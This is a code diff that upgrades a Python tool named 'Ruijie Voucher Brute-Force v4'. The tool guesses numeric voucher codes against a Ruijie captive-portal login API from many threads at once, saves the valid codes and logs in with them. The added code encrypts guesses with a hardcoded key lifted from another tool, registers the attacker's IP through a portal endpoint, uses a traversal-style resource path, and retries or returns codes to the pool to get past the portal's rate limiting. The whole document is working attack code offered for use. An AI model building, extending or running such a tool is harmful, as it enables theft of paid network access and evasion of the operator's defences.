@@ -3,13 +3,57 @@
 Ruijie Voucher Brute-Force v4
 Features: target count, resume, range split, auto-login
 """
-import sys, threading, time, urllib.parse, queue, random, os, datetime, pickle
+import sys, threading, time, urllib.parse, queue, random, os, datetime, pickle, hashlib, base64
 import requests, urllib3
 urllib3.disable_warnings()
 
 CODES_FILE = "valid_codes.txt"
 LOCK = threading.Lock()
 STOP = threading.Event()
+
+# CryptoJS-compatible AES encryption key (from star tool)
+ENC_KEY = b"RjYkhwzx$2018!"
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+    HAVE_CRYPTO = True
+except ImportError:
+    HAVE_CRYPTO = False
+
+def cryptojs_encrypt(plaintext):
+    """CryptoJS AES.encrypt() compatible with ENC_KEY passphrase"""
+    if not HAVE_CRYPTO:
+        return None
+    salt = os.urandom(8)
+    data = hashlib.md5(ENC_KEY + salt).digest()
+    key_iv = data
+    while len(key_iv) < 48:
+        data = hashlib.md5(data + ENC_KEY + salt).digest()
+        key_iv += data
+    key, iv = key_iv[:32], key_iv[32:48]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+    return base64.b64encode(b"Salted__" + salt + ct).decode()
+
+def try_maccauth_verify(sess, host, sid, code):
+    """Verify a code via the maccauth portal page"""
+    res_id = "mrlev58jlgslg49ervu"
+    url = f"{host}/download/static/maccauth/src/index.html"
+    url += f"?RES=./../expand/res/{res_id}&IS_EG=0&sessionId={sid}"
+    try:
+        r = sess.get(url, timeout=10)
+        # If page loads, try encrypting the code and posting
+        if r.status_code == 200 and "maccauth" in r.text:
+            encrypted = cryptojs_encrypt(code)
+            if encrypted:
+                auth_url = f"{host}/api/auth/voucher/?lang=en_US"
+                r2 = sess.post(auth_url, json={
+                    "accessCode": encrypted, "sessionId": sid, "apiVersion": 1
+                }, timeout=5)
+                return r2.json()
+        return None
+    except:
+        return None
 
 # ===== Helpers =====
 
@@ -73,6 +117,12 @@ def detect_portal():
     if not sid: return None, None, None, None, "No sessionId"
     gw_addr = qp.get("gw_address", ["192.168.110.1"])[0]
     gw_port = qp.get("gw_port", ["2060"])[0]
+    # Call saveInternal to register our IP with the portal server
+    try:
+        sess.post(f"{host}/api/auth/saveInternal", json={
+            "internalIp": gw_addr, "internalPort": gw_port, "sessionId": sid
+        }, timeout=5)
+    except: pass
     return sess, host, params, sid, (gw_addr, gw_port)
 
 def refresh_session(host, params):
@@ -176,6 +226,15 @@ class BitmapTracker:
         with self.lock:
             self.found.append(code)
 
+    def unclaim(self, code_int):
+        with self.lock:
+            off = code_int - self.start
+            if self.data[off >> 3] & (1 << (off & 7)):
+                self.data[off >> 3] &= ~(1 << (off & 7))
+                self.tried -= 1
+                return True
+        return False
+
     def progress_frac(self):
         return self.tried / self.total if self.total else 0
 
@@ -242,11 +301,12 @@ def numeric_bruteforce(length):
     safe_count = 0
     errors = 0
     success_count = 0
+    rate_limited = 0
     global_refresh_counter = 0
     REFRESH_LOCK = threading.Lock()
 
     def worker():
-        nonlocal errors, success_count, global_refresh_counter
+        nonlocal errors, success_count, rate_limited, global_refresh_counter
         sess2 = requests.Session()
         sess2.verify = False
         sess2.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
@@ -256,35 +316,47 @@ def numeric_bruteforce(length):
             if code_int is None:
                 break
             code = str(code_int).zfill(length)
-            with LOCK: sid_current = SID_DATA["sid"]
-            try:
-                r = sess2.post(api_url, json={
-                    "accessCode": code, "sessionId": sid_current, "apiVersion": 1
-                }, timeout=5)
-                j = r.json()
-                if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
-                    print(f"\n  >>> VALID: {code}")
-                    save_code(code)
-                    bt.add_found(code)
-                    if target and len(bt.found) >= target:
-                        STOP.set()
-                        break
-                else:
+            retries = 0
+            while retries < 3:
+                with LOCK: sid_current = SID_DATA["sid"]
+                try:
+                    r = sess2.post(api_url, json={
+                        "accessCode": code, "sessionId": sid_current, "apiVersion": 1
+                    }, timeout=5)
+                    j = r.json()
+                    msg = j.get("message", "")
+                    if msg == "request limited":
+                        retries += 1
+                        if retries >= 3:
+                            with LOCK: rate_limited += 1
+                            bt.unclaim(code_int)
+                            break  # give up, return code to pool
+                        time.sleep(0.2 * retries)
+                        continue  # retry same code
+                    if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
+                        print(f"\n  >>> VALID: {code}")
+                        save_code(code)
+                        bt.add_found(code)
+                        if target and len(bt.found) >= target:
+                            STOP.set()
+                            return
+                    else:
+                        with LOCK:
+                            if success_count == 0 and rate_limited == 0 and errors == 0:
+                                print(f"\n  [API sample] code={code} | message={msg}")
+                    with LOCK: success_count += 1
+                    break
+                except Exception as e:
                     with LOCK:
-                        if success_count == 0 and errors == 0:
-                            msg = j.get("message", "?")
-                            print(f"\n  [API sample] code={code} | message={msg}")
-                with LOCK: success_count += 1
-            except Exception as e:
-                with LOCK:
-                    errors += 1
-                    if errors == 1:
-                        print(f"\n  [!] First error: {e} | Response status: {r.status_code if 'r' in dir() else 'N/A'}")
-                        try:
-                            print(f"  [!] Response body: {r.text[:200]}")
-                        except: pass
-                    elif errors % 100 == 0:
-                        print(f"\n  [!] {errors} errors so far (e.g.: {type(e).__name__})")
+                        errors += 1
+                        if errors == 1:
+                            print(f"\n  [!] First error: {e} | Response status: {r.status_code if 'r' in dir() else 'N/A'}")
+                            try:
+                                print(f"  [!] Response body: {r.text[:200]}")
+                            except: pass
+                        elif errors % 100 == 0:
+                            print(f"\n  [!] {errors} errors so far (e.g.: {type(e).__name__})")
+                    break
             # Global session refresh (shared counter across all threads)
             with REFRESH_LOCK:
                 global_refresh_counter += 1
@@ -310,13 +382,15 @@ def numeric_bruteforce(length):
                 tried = bt.tried
                 e = errors
                 s = success_count
+                rl = rate_limited
             rate = (tried - last_tried) / 2
             rem = bt.total - tried
             eta = fmt_eta(rem, rate) if rate > 0 else "?m"
             pct = tried * 100 / bt.total
             err_pct = e / (tried or 1) * 100
+            rl_pct = rl / (tried or 1) * 100
             warn = " *** HIGH ERROR RATE - API MAY BE BROKEN ***" if err_pct > 50 and tried > 100 else ""
-            sys.stdout.write(f"\r  {tried:,}/{bt.total:,} ({pct:.2f}%) | {rate:.0f}/s | ETA: {eta} | Found: {len(bt.found)} | OK: {s} | ERR: {e} ({err_pct:.0f}%){warn}")
+            sys.stdout.write(f"\r  {tried:,}/{bt.total:,} ({pct:.2f}%) | {rate:.0f}/s | ETA: {eta} | Found: {len(bt.found)} | OK: {s} | RL: {rl} ({rl_pct:.0f}%) | ERR: {e} ({err_pct:.0f}%){warn}")
             sys.stdout.flush()
             last_tried = tried
             safe_count += 1
@@ -508,7 +582,8 @@ def login_menu():
     codes = load_codes()
     if not codes:
         print("No saved codes"); return
-    print("\nChecking saved codes (may consume them)...")
+    print("\nChecking saved codes...")
+    print("NOTE: 'request limited' responses preserve codes (try again later)\n")
     result = detect_portal()
     sess, host, params, sid, extra = result
     if isinstance(extra, str):
@@ -516,6 +591,7 @@ def login_menu():
     api_url = f"{host}/api/auth/voucher/?lang=en_US"
     valid = []
     invalid = []
+    skipped = []
     for code in codes:
         try:
             r = sess.post(api_url, json={
@@ -524,16 +600,20 @@ def login_menu():
             j = r.json()
             if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                 valid.append((code, j["result"]["logonUrl"]))
+            elif j.get("message") == "request limited":
+                skipped.append(code)
             else:
                 invalid.append(code)
         except:
             invalid.append(code)
-        sys.stdout.write(f"\r  Checked {len(valid)+len(invalid)}/{len(codes)} | Valid: {len(valid)}")
+        sys.stdout.write(f"\r  Checked {len(valid)+len(invalid)+len(skipped)}/{len(codes)} | Valid: {len(valid)} | Limited: {len(skipped)}")
         sys.stdout.flush()
     print()
     if invalid:
         remove_codes(invalid)
         print(f"Removed {len(invalid)} invalid codes")
+    if skipped:
+        print(f"Preserved {len(skipped)} rate-limited codes (not invalid)")
     if not valid:
         print("No valid codes remaining"); return
     print(f"\nValid codes ({len(valid)}):")
